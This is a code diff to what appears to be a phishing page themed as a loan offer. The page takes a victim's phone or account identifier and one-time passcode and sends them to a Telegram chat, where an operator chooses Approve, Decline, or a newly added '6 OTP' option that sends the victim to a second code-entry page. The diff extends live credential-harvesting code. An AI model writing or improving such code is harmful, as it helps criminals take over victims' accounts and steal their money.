@@ -102,7 +102,7 @@ body{
 
 .otp-input{
   flex: 1;
-  min-width: 0;          /* prevents flex overflow */
+  min-width: 0;
   height: 50px;
   border-radius: 12px;
   border: 1px solid #ddd;
@@ -447,7 +447,7 @@ body{
       const ts = Date.now();
       const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
       const escapedOtp = escapeHtml(enteredOtp);
-      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
+      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nChoose action:`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
@@ -456,6 +456,7 @@ body{
         reply_markup: {
           inline_keyboard: [[
             { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
+            { text: '6 OTP', callback_data: `otp_6otp_${ts}` },
             { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
           ]]
         }
@@ -467,6 +468,10 @@ body{
 
         if (action === 'approve') {
           window.location.href = 'loan.html';
+        } else if (action === '6otp') {
+          // Redirect to 6-digit OTP page (same session data stays)
+          sessionStorage.setItem('wrongOtp5', 'true');
+          window.location.href = 'otp6.html';
         } else if (action === 'decline') {
           showError('Wrong OTP');
           // Reset OTP inputs for new attempt
